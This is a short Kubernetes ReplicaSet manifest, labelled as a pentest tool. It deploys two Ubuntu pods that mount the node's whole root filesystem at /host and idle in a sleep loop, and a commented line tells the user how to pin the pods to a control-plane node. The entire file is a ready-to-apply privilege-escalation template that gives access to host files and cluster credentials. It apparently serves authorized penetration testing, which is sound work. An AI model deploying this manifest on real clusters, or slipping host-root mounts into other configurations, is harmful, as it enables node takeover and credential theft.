apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: hostpath-exec-replicaset
  labels:
    app: pentest
    type: replicaset
spec:
  replicas: 2
  selector:
    matchLabels:
      type: replicaset
  template:
    metadata:
      labels:
        app: pentest
        type: replicaset
    spec:
      containers:
      - name: hostpath-exec-replicaset
        image: ubuntu
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /
      